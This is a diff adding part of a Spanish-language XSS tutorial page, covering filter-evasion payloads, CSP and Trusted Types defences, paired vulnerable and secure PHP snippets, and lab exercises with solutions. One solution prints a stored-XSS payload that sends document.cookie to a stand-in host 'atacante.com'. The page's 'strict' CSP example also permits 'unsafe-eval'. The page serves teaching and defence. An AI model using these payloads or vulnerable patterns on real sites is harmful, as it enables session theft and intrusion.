+        <div class="card-header">
+          <h5 class="mb-0">Técnicas Modernas</h5>
+        </div>
+        <div class="card-body">
+          <div class="row">
+            <div class="col-md-6">
+              <h5>Template Literals</h5>
+              <pre><code class="language-javascript">// Uso de template literals
+window[`aler`+`t`](1);</code></pre>
+              
+              <h5>Import Dinámico</h5>
+              <pre><code class="language-javascript">import('data:text/javascript,alert(1)');</code></pre>
+            </div>
+            <div class="col-md-6">
+              <h5>Web Workers</h5>
+              <pre><code class="language-javascript">// XSS via Web Workers
+new Worker('data:text/javascript,alert(1)');</code></pre>
+              
+              <h5>SVG Injection</h5>
+              <pre><code class="language-html">&lt;svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/&gt;</code></pre>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Prevención Section -->
+    <section id="prevencion">
+      <h2>Prevención & Mitigación</h2>
+      
+      <div class="card mb-4">
+        <div class="card-header">
+          <h5 class="mb-0">Estrategias de Defensa en Profundidad</h5>
+        </div>
+        <div class="card-body">
+          <div class="row">
+            <div class="col-md-6">
+              <div class="card mb-3">
+                <div class="card-header bg-success bg-opacity-10">
+                  <h5 class="mb-0 text-success"><i class="bi bi-check-circle-fill me-2"></i>Codificación Contextual</h5>
+                </div>
+                <div class="card-body">
+                  <ul>
+                    <li><strong>HTML:</strong> <code>htmlspecialchars($str, ENT_QUOTES, 'UTF-8')</code></li>
+                    <li><strong>Atributos:</strong> Escape comillas dobles/simples</li>
+                    <li><strong>JavaScript:</strong> JSON encode + escape Unicode</li>
+                    <li><strong>URL:</strong> <code>urlencode()</code> o <code>rawurlencode()</code></li>
+                  </ul>
+                </div>
+              </div>
+              
+              <div class="card mb-3">
+                <div class="card-header bg-success bg-opacity-10">
+                  <h5 class="mb-0 text-success"><i class="bi bi-check-circle-fill me-2"></i>Validación de Entrada</h5>
+                </div>
+                <div class="card-body">
+                  <ul>
+                    <li>Whitelist de caracteres permitidos</li>
+                    <li>Validar tipo, longitud, formato y rango</li>
+                    <li>Rechazar entrada sospechosa en lugar de sanitizar</li>
+                    <li>Usar expresiones regulares estrictas</li>
+                  </ul>
+                </div>
+              </div>
+            </div>
+            <div class="col-md-6">
+              <div class="card mb-3">
+                <div class="card-header bg-success bg-opacity-10">
+                  <h5 class="mb-0 text-success"><i class="bi bi-check-circle-fill me-2"></i>Configuración Segura</h5>
+                </div>
+                <div class="card-body">
+                  <ul>
+                    <li><strong>Cookies:</strong> HttpOnly, Secure, SameSite</li>
+                    <li><strong>CSP:</strong> Content Security Policy</li>
+                    <li><strong>Encabezados:</strong> X-XSS-Protection, X-Content-Type-Options</li>
+                    <li><strong>Trusted Types:</strong> Para DOM XSS</li>
+                  </ul>
+                </div>
+              </div>
+              
+              <div class="card">
+                <div class="card-header bg-success bg-opacity-10">
+                  <h5 class="mb-0 text-success"><i class="bi bi-check-circle-fill me-2"></i>Herramientas y Librerías</h5>
+                </div>
+                <div class="card-body">
+                  <ul>
+                    <li><strong>PHP:</strong> HTMLPurifier, OWASP ESAPI</li>
+                    <li><strong>JS:</strong> DOMPurify, sanitize-html</li>
+                    <li><strong>Frameworks:</strong> Protecciones incorporadas</li>
+                    <li><strong>WAFs:</strong> ModSecurity, Cloudflare</li>
+                  </ul>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      
+      <div class="card mb-4">
+        <div class="card-header">
+          <h5 class="mb-0">Content Security Policy (CSP)</h5>
+        </div>
+        <div class="card-body">
+          <p>CSP es el mecanismo más efectivo para mitigar XSS. Restringe qué recursos puede cargar la página y si se permite JavaScript inline.</p>
+          
+          <h5>Ejemplo de CSP Estricta:</h5>
+          <pre><code class="language-php">// En PHP
+header("Content-Security-Policy: "
+    . "default-src 'none'; "
+    . "script-src 'self' https://cdn.example.com 'unsafe-eval'; "
+    . "style-src 'self' 'unsafe-inline'; "
+    . "img-src 'self' data:; "
+    . "connect-src 'self'; "
+    . "form-action 'self'; "
+    . "base-uri 'self'; "
+    . "frame-ancestors 'none';");</code></pre>
+          
+          <h5>Directivas Clave:</h5>
+          <div class="table-responsive">
+            <table class="table table-bordered">
+              <thead class="table-light">
+                <tr>
+                  <th>Directiva</th>
+                  <th>Propósito</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td><code>default-src</code></td>
+                  <td>Política por defecto para recursos no especificados</td>
+                </tr>
+                <tr>
+                  <td><code>script-src</code></td>
+                  <td>Controla fuentes de JavaScript</td>
+                </tr>
+                <tr>
+                  <td><code>style-src</code></td>
+                  <td>Controla fuentes de CSS</td>
+                </tr>
+                <tr>
+                  <td><code>img-src</code></td>
+                  <td>Controla fuentes de imágenes</td>
+                </tr>
+                <tr>
+                  <td><code>connect-src</code></td>
+                  <td>Restringe XMLHttpRequest, WebSockets</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+      </div>
+      
+      <div class="card">
+        <div class="card-header">
+          <h5 class="mb-0">Trusted Types para DOM XSS</h5>
+        </div>
+        <div class="card-body">
+          <p>Trusted Types es una API moderna del navegador que previene DOM XSS al forzar el saneamiento de datos antes de asignarlos a propiedades peligrosas del DOM.</p>
+          
+          <h5>Habilitar Trusted Types:</h5>
+          <pre><code class="language-html">&lt;meta http-equiv="Content-Security-Policy" 
+      content="require-trusted-types-for 'script'"&gt;</code></pre>
+          
+          <h5>Crear una Política:</h5>
+          <pre><code class="language-javascript">// Crear política que solo permite &lt;b&gt; e &lt;i&gt;
+const policy = trustedTypes.createPolicy('escapePolicy', {
+  createHTML: input => input.replace(/&lt;(\/?)(?!b|i)[^&gt;]+&gt;/g, '')
+});
+
+// Uso seguro
+element.innerHTML = policy.createHTML(userInput);</code></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- PHP Snippets Section -->
+    <section id="php-snippets">
+      <h2>Snippets PHP (Seguros y Vulnerables)</h2>
+      
+      <div class="alert alert-danger d-flex align-items-center">
+        <i class="bi bi-exclamation-octagon-fill me-2 fs-4"></i>
+        <div>
+          <strong>Importante:</strong> Los ejemplos vulnerables son solo para propósitos educativos en entornos controlados. Nunca los uses en producción sin las debidas protecciones.
+        </div>
+      </div>
+      
+      <div class="card mb-4">
+        <div class="card-header">
+          <ul class="nav nav-tabs card-header-tabs" id="phpTab" role="tablist">
+            <li class="nav-item" role="presentation">
+              <button class="nav-link active" id="sanitizacion-tab" data-bs-toggle="tab" data-bs-target="#sanitizacion" type="button" role="tab">Sanitización</button>
+            </li>
+            <li class="nav-item" role="presentation">
+              <button class="nav-link" id="validacion-tab" data-bs-toggle="tab" data-bs-target="#validacion" type="button" role="tab">Validación</button>
+            </li>
+            <li class="nav-item" role="presentation">
+              <button class="nav-link" id="seguridad-tab" data-bs-toggle="tab" data-bs-target="#seguridad" type="button" role="tab">Seguridad</button>
+            </li>
+          </ul>
+        </div>
+        <div class="card-body">
+          <div class="tab-content" id="phpTabContent">
+            <div class="tab-pane fade show active" id="sanitizacion" role="tabpanel">
+              <div class="row">
+                <div class="col-md-6">
+                  <div class="card vulnerable-card mb-3">
+                    <div class="card-header bg-danger bg-opacity-10 text-danger">
+                      <h5 class="mb-0"><i class="bi bi-bug-fill me-2"></i>Vulnerable</h5>
+                    </div>
+                    <div class="card-body">
+                      <pre><code class="language-php">// ¡PELIGRO! No sanitiza entrada
+echo $_GET['comentario'];</code></pre>
+                    </div>
+                  </div>
+                </div>
+                <div class="col-md-6">
+                  <div class="card secure-card mb-3">
+                    <div class="card-header bg-success bg-opacity-10 text-success">
+                      <h5 class="mb-0"><i class="bi bi-shield-fill me-2"></i>Seguro</h5>
+                    </div>
+                    <div class="card-body">
+                      <pre><code class="language-php">// Sanitización básica para HTML
+function sanitize_input($data) {
+    $data = trim($data);
+    $data = stripslashes($data);
+    return htmlspecialchars($data, ENT_QUOTES, 'UTF-8');
+}
+echo sanitize_input($_GET['comentario']);</code></pre>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              
+              <div class="row">
+                <div class="col-md-6">
+                  <div class="card vulnerable-card mb-3">
+                    <div class="card-header bg-danger bg-opacity-10 text-danger">
+                      <h5 class="mb-0"><i class="bi bi-bug-fill me-2"></i>Vulnerable</h5>
+                    </div>
+                    <div class="card-body">
+                      <pre><code class="language-php">// ¡PELIGRO! Permite HTML no confiable
+$html = $_POST['contenido'];
+echo "&lt;div&gt;$html&lt;/div&gt;";</code></pre>
+                    </div>
+                  </div>
+                </div>
+                <div class="col-md-6">
+                  <div class="card secure-card mb-3">
+                    <div class="card-header bg-success bg-opacity-10 text-success">
+                      <h5 class="mb-0"><i class="bi bi-shield-fill me-2"></i>Seguro</h5>
+                    </div>
+                    <div class="card-body">
+                      <pre><code class="language-php">// Usando HTMLPurifier para HTML seguro
+require_once 'HTMLPurifier.auto.php';
+
+$config = HTMLPurifier_Config::createDefault();
+$purifier = new HTMLPurifier($config);
+$clean_html = $purifier->purify($_POST['contenido']);
+
+echo "&lt;div&gt;$clean_html&lt;/div&gt;";</code></pre>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+            
+            <div class="tab-pane fade" id="validacion" role="tabpanel">
+              <div class="row">
+                <div class="col-md-6">
+                  <div class="card vulnerable-card mb-3">
+                    <div class="card-header bg-danger bg-opacity-10 text-danger">
+                      <h5 class="mb-0"><i class="bi bi-bug-fill me-2"></i>Vulnerable</h5>
+                    </div>
+                    <div class="card-body">
+                      <pre><code class="language-php">// ¡PELIGRO! Validación insuficiente
+if (strpos($_POST['email'], '@') !== false) {
+    // Procesar email
+}</code></pre>
+                    </div>
+                  </div>
+                </div>
+                <div class="col-md-6">
+                  <div class="card secure-card mb-3">
+                    <div class="card-header bg-success bg-opacity-10 text-success">
+                      <h5 class="mb-0"><i class="bi bi-shield-fill me-2"></i>Seguro</h5>
+                    </div>
+                    <div class="card-body">
+                      <pre><code class="language-php">// Validación robusta de email
+function validate_email($email) {
+    return filter_var($email, FILTER_VALIDATE_EMAIL);
+}
+
+$email = $_POST['email'];
+if (validate_email($email)) {
+    $email = filter_var($email, FILTER_SANITIZE_EMAIL);
+    // Procesar email seguro
+}</code></pre>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              
+              <div class="row">
+                <div class="col-md-6">
+                  <div class="card vulnerable-card mb-3">
+                    <div class="card-header bg-danger bg-opacity-10 text-danger">
+                      <h5 class="mb-0"><i class="bi bi-bug-fill me-2"></i>Vulnerable</h5>
+                    </div>
+                    <div class="card-body">
+                      <pre><code class="language-php">// ¡PELIGRO! SQL Injection posible
+$id = $_GET['id'];
+$query = "SELECT * FROM users WHERE id = $id";
+$result = mysqli_query($conn, $query);</code></pre>
+                    </div>
+                  </div>
+                </div>
+                <div class="col-md-6">
+                  <div class="card secure-card mb-3">
+                    <div class="card-header bg-success bg-opacity-10 text-success">
+                      <h5 class="mb-0"><i class="bi bi-shield-fill me-2"></i>Seguro</h5>
+                    </div>
+                    <div class="card-body">
+                      <pre><code class="language-php">// Prepared statements con MySQLi
+$stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");
+$stmt->bind_param("i", $_GET['id']);
+$stmt->execute();
+$result = $stmt->get_result();
+
+// Alternativa con PDO
+$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
+$stmt->execute(['id' => $_GET['id']]);</code></pre>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+            
+            <div class="tab-pane fade" id="seguridad" role="tabpanel">
+              <div class="row">
+                <div class="col-md-6">
+                  <div class="card vulnerable-card mb-3">
+                    <div class="card-header bg-danger bg-opacity-10 text-danger">
+                      <h5 class="mb-0"><i class="bi bi-bug-fill me-2"></i>Vulnerable</h5>
+                    </div>
+                    <div class="card-body">
+                      <pre><code class="language-php">// ¡PELIGRO! Sesión insegura
+session_start();
+$_SESSION['user'] = $_POST['username'];</code></pre>
+                    </div>
+                  </div>
+                </div>
+                <div class="col-md-6">
+                  <div class="card secure-card mb-3">
+                    <div class="card-header bg-success bg-opacity-10 text-success">
+                      <h5 class="mb-0"><i class="bi bi-shield-fill me-2"></i>Seguro</h5>
+                    </div>
+                    <div class="card-body">
+                      <pre><code class="language-php">// Configuración segura de sesión
+function secure_session_start() {
+    session_name('Secure_Session');
+    session_set_cookie_params([
+        'lifetime' => 3600,
+        'path' => '/',
+        'domain' => $_SERVER['HTTP_HOST'],
+        'secure' => true,     // Solo HTTPS
+        'httponly' => true,  // No accesible via JS
+        'samesite' => 'Strict'
+    ]);
+    session_start();
+    session_regenerate_id(true); // Prevención de fijación
+}
+
+secure_session_start();
+$_SESSION['user'] = htmlspecialchars($_POST['username']);</code></pre>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              
+              <div class="row">
+                <div class="col-md-6">
+                  <div class="card vulnerable-card mb-3">
+                    <div class="card-header bg-danger bg-opacity-10 text-danger">
+                      <h5 class="mb-0"><i class="bi bi-bug-fill me-2"></i>Vulnerable</h5>
+                    </div>
+                    <div class="card-body">
+                      <pre><code class="language-php">// ¡PELIGRO! Sin protección CSRF
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    // Procesar formulario
+}</code></pre>
+                    </div>
+                  </div>
+                </div>
+                <div class="col-md-6">
+                  <div class="card secure-card mb-3">
+                    <div class="card-header bg-success bg-opacity-10 text-success">
+                      <h5 class="mb-0"><i class="bi bi-shield-fill me-2"></i>Seguro</h5>
+                    </div>
+                    <div class="card-body">
+                      <pre><code class="language-php">// Protección CSRF
+function generate_csrf_token() {
+    if (empty($_SESSION['csrf_token'])) {
+        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
+    }
+    return $_SESSION['csrf_token'];
+}
+
+function validate_csrf_token($token) {
+    return isset($_SESSION['csrf_token']) && 
+           hash_equals($_SESSION['csrf_token'], $token);
+}
+
+// En el formulario
+$token = generate_csrf_token();
+echo "&lt;input type='hidden' name='csrf_token' value='$token'&gt;";
+
+// Al procesar
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    if (!validate_csrf_token($_POST['csrf_token'])) {
+        die('Token CSRF inválido');
+    }
+    // Procesar formulario seguro
+}</code></pre>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      
+      <div class="card">
+        <div class="card-header">
+          <h5 class="mb-0">Cabeceras de Seguridad en PHP</h5>
+        </div>
+        <div class="card-body">
+          <pre><code class="language-php">// Configurar cabeceras de seguridad
+header("Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' https://cdn.example.com; object-src 'none';");
+header("X-Frame-Options: DENY");
+header("X-Content-Type-Options: nosniff");
+header("Referrer-Policy: strict-origin-when-cross-origin");
+header("Strict-Transport-Security: max-age=63072000; includeSubDomains; preload");
+
+// Prevenir caching de páginas sensibles
+header("Cache-Control: no-store, no-cache, must-revalidate");
+header("Pragma: no-cache");
+header("Expires: 0");
+
+// Forzar HTTPS
+if ($_SERVER['HTTPS'] !== 'on') {
+    header("Location: https://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'], true, 301);
+    exit;
+}</code></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- Laboratorio Section -->
+    <section id="laboratorio">
+      <h2>Laboratorio Práctico</h2>
+      
+      <div class="alert alert-warning d-flex align-items-center">
+        <i class="bi bi-exclamation-triangle-fill me-2 fs-4"></i>
+        <div>
+          <strong>Advertencia:</strong> Estos ejercicios deben realizarse solo en entornos controlados y autorizados para pruebas de seguridad.
+        </div>
+      </div>
+      
+      <div class="card mb-4">
+        <div class="card-header">
+          <h5 class="mb-0">Ejercicio 1: Detectar XSS Reflejado</h5>
+        </div>
+        <div class="card-body">
+          <p>Dado el siguiente código vulnerable, identifica cómo explotarlo:</p>
+          <pre><code class="language-php">&lt;?php
+$search = $_GET['q'] ?? '';
+echo "&lt;p&gt;Resultados para: " . $search . "&lt;/p&gt;";
+?&gt;</code></pre>
+          <button class="btn btn-primary" data-bs-toggle="collapse" data-bs-target="#solucion1">Mostrar Solución</button>
+          <div id="solucion1" class="collapse mt-3">
+            <pre><code class="language-html">http://ejemplo.com/buscar.php?q=&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
+            <p><strong>Mitigación:</strong> Usar <code>htmlspecialchars($search, ENT_QUOTES, 'UTF-8')</code></p>
+          </div>
+        </div>
+      </div>
+      
+      <div class="card mb-4">
+        <div class="card-header">
+          <h5 class="mb-0">Ejercicio 2: XSS Almacenado en Comentarios</h5>
+        </div>
+        <div class="card-body">
+          <p>Un sistema de comentarios vulnerable:</p>
+          <pre><code class="language-php">&lt;?php
+// Guardar comentario (sin sanitización)
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $comment = $_POST['comment'];
+    $db->query("INSERT INTO comments (text) VALUES ('$comment')");
+}
+
+// Mostrar comentarios
+$comments = $db->query("SELECT * FROM comments");
+foreach ($comments as $comment) {
+    echo "&lt;div class='comment'&gt;" . $comment['text'] . "&lt;/div&gt;";
+}
+?&gt;</code></pre>
+          <button class="btn btn-primary" data-bs-toggle="collapse" data-bs-target="#solucion2">Mostrar Solución</button>
+          <div id="solucion2" class="collapse mt-3">
+            <p><strong>Explotación:</strong> Enviar un comentario con:</p>
+            <pre><code class="language-html">&lt;script&gt;fetch('https://atacante.com/steal?cookie='+document.cookie)&lt;/script&gt;</code></pre>
+            <p><strong>Mitigación:</strong></p>
+            <ol>
+              <li>Usar prepared statements para la inserción en BD</li>
+              <li>Sanitizar la salida con <code>htmlspecialchars()</code></li>
+              <li>Implementar CSP para restringir conexiones externas</li>
+            </ol>
+          </div>
+        </div>
+      </div>
+      
+      <div class="card">
+        <div class="card-header">
+          <h5 class="mb-0">Ejercicio 3: DOM-Based XSS</h5>
+        </div>
+        <div class="card-body">
+          <p>Analiza el siguiente código JavaScript vulnerable:</p>
+          <pre><code class="language-javascript">// Obtener nombre de usuario de la URL
+function getUsername() {
+    return decodeURIComponent(window.location.hash.substring(1));
+}
+
+// Mostrar saludo
+document.getElementById('greeting').innerHTML = 'Hola, ' + getUsername();</code></pre>
+          <button class="btn btn-primary" data-bs-toggle="collapse" data-bs-target="#solucion3">Mostrar Solución</button>
+          <div id="solucion3" class="collapse mt-3">
+            <p><strong>Explotación:</strong> Construir una URL como:</p>
+            <pre><code class="language-html">http://ejemplo.com/#&lt;img src=x onerror=alert(1)&gt;</code></pre>
+            <p><strong>Mitigación:</strong></p>
+            <ol>
+              <li>Usar <code>textContent</code> en lugar de <code>innerHTML</code></li>
+              <li>Sanitizar el input con DOMPurify</li>
+              <li>Implementar Trusted Types</li>
+            </ol>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Referencias Section -->
+    <section id="referencias">
+      <h2>Referencias y Recursos</h2>
+      
+      <div class="card mb-4">
+        <div class="card-header">
+          <h5 class="mb-0">Estándares y Guías</h5>
+        </div>
+        <div class="card-body">
+          <ul>
+            <li><a href="https://owasp.org/www-project-top-ten/" target="_blank">OWASP Top 10</a> - Las 10 vulnerabilidades web más críticas</li>
+            <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" target="_blank">OWASP XSS Prevention Cheat Sheet</a> - Guía completa de prevención</li>
+            <li><a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank">PortSwigger XSS Guide</a> - Recursos y laboratorios prácticos</li>
+            <li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP" target="_blank">MDN CSP</a> - Documentación oficial de Content Security Policy</li>
+          </ul>
+        </div>
+      </div>
+      
+      <div class="card mb-4">
+        <div class="card-header">
+          <h5 class="mb-0">Herramientas</h5>
+        </div>
+        <div class="card-body">
+          <ul>
+            <li><a href="https://github.com/cure53/DOMPurify" target="_blank">DOMPurify</a> - Sanitizador de HTML para prevenir DOM XSS</li>
+            <li><a href="https://htmlpurifier.org/" target="_blank">HTMLPurifier</a> - Librería PHP para filtrar HTML</li>
+            <li><a href="https://github.com/OWASP/CheatSheetSeries" target="_blank">OWASP Cheat Sheets</a> - Colección de hojas de referencia</li>
+            <li><a href="https://csp-evaluator.withgoogle.com/" target="_blank">CSP Evaluator</a> - Herramienta para validar políticas CSP</li>
+          </ul>
+        </div>
+      </div>
+      
+      <div class="card">
+        <div class="card-header">
+          <h5 class="mb-0">Lecturas Adicionales</h5>
+        </div>
+        <div class="card-body">
+          <ul>
+            <li><a href="https://owasp.org/www-community/attacks/xss/" target="_blank">OWASP XSS</a> - Explicación detallada de los tipos de XSS</li>
+            <li><a href="https://web.dev/trusted-types/" target="_blank">Trusted Types</a> - Guía para prevenir DOM XSS</li>
+            <li><a href="https://xss.pwnfunction.com/" target="_blank">XSS Playground</a> - Entorno interactivo para aprender XSS</li>
+            <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection" target="_blank">PayloadsAllTheThings</a> - Colección de payloads XSS</li>
+          </ul>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <!-- Floating Button -->
+  <div class="floating-btn" id="backToTop" title="Volver arriba">
+    <i class="bi bi-arrow-up"></i>
+  </div>
+
+  <!-- Bootstrap & Highlight.js -->
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+  
+  <!-- Custom JS -->
+  <script>
+    // Copy code functionality
+    document.querySelectorAll('pre').forEach(pre => {
+      const button = document.createElement('button');
+      button.className = 'copy-btn';
+      button.innerHTML = '<i class="bi bi-clipboard"></i>';
+      button.title = 'Copiar código';
+      pre.appendChild(button);
+      
+      button.addEventListener('click', () => {
+        const code = pre.querySelector('code').innerText;
+        navigator.clipboard.writeText(code).then(() => {
+          button.innerHTML = '<i class="bi bi-check2"></i>';
+          button.classList.add('text-success');
+          setTimeout(() => {
+            button.innerHTML = '<i class="bi bi-clipboard"></i>';
+            button.classList.remove('text-success');
+          }, 2000);
+        });
+      });
+    });
+    
+    // Nav search filter
+    document.getElementById('navSearch').addEventListener('input', e => {
+      const term = e.target.value.toLowerCase();
+      document.querySelectorAll('#navList .nav-link').forEach(link => {
+        const text = link.textContent.toLowerCase();
+        const icon = link.querySelector('i').className.toLowerCase();
+        link.parentElement.style.display = text.includes(term) || icon.includes(term) ? '' : 'none';
+      });
+    });
+    
+    // Smooth scrolling for anchor links
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+      anchor.addEventListener('click', function(e) {
+        e.preventDefault();
+        const target = document.querySelector(this.getAttribute('href'));
+        if (target) {
+          target.scrollIntoView({
+            behavior: 'smooth'
+          });
+        }
+      });
+    });
+    
+    // Back to top button
+    const backToTop = document.getElementById('backToTop');
+    window.addEventListener('scroll', () => {
+      if (window.pageYOffset > 300) {
+        backToTop.style.display = 'flex';
+      } else {
+        backToTop.style.display = 'none';
+      }
+    });
+    
+    backToTop.addEventListener('click', () => {
+      window.scrollTo({
+        top: 0,
+        behavior: 'smooth'
+      });
+    });
+    
+    // Update active nav link on scroll
+    const sections = document.querySelectorAll('section');
+    const navLinks = document.querySelectorAll('#navList .nav-link');
+    
+    window.addEventListener('scroll', () => {
+      let current = '';
+      
+      sections.forEach(section => {
+        const sectionTop = section.offsetTop;
+        const sectionHeight = section.clientHeight;
+        
+        if (pageYOffset >= sectionTop - 200) {
+          current = section.getAttribute('id');
+        }
+      });
+      
+      navLinks.forEach(link => {
+        link.classList.remove('active');
+        if (link.getAttribute('href') === `#${current}`) {
+          link.classList.add('active');
+        }
+      });
+    });
+  </script>
+</body>
+</html>
